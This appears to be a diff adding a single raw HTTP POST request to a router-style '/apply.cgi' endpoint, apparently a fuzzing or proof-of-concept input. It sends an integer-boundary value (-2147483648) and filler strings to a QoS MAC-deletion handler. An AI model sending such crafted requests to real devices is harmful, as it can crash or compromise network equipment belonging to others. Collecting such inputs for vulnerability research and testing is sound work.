@@ -1,0 +1,6 @@
+POST /apply.cgi?form_submit HTTP/1.1
+Host: 242
+Content-Type: application/json
+Content-Length: 103
+
+hijack_refresh_counter=-2147483648&%20timestamp=wzqwzqwzq&submit_flag=qos_delmac&filename=wzqwzqwzq
